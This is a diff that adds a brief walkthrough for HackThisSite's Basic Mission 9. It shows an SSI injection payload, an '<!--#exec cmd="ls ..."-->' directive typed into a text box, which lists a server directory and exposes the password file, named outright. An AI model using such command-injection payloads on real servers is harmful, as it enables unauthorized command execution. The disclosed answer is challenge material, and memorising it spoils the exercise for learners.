@@ -1,0 +1,4 @@
+SSI(ServerSideIncludes) Injection-
+Go back to Basic Mission 8 and in the text box type-<!--#exec cmd="ls /var/www/hackthissite.org/html/missions/basic/9/"-->
+The ouptut contains names of the files in the /var/www/hackthissite.org/html/missions/basic/9/ directory which contains the password file.
+The password is present in www/hackthissite.org/html/missions/basic/9/p91e283zc3.php
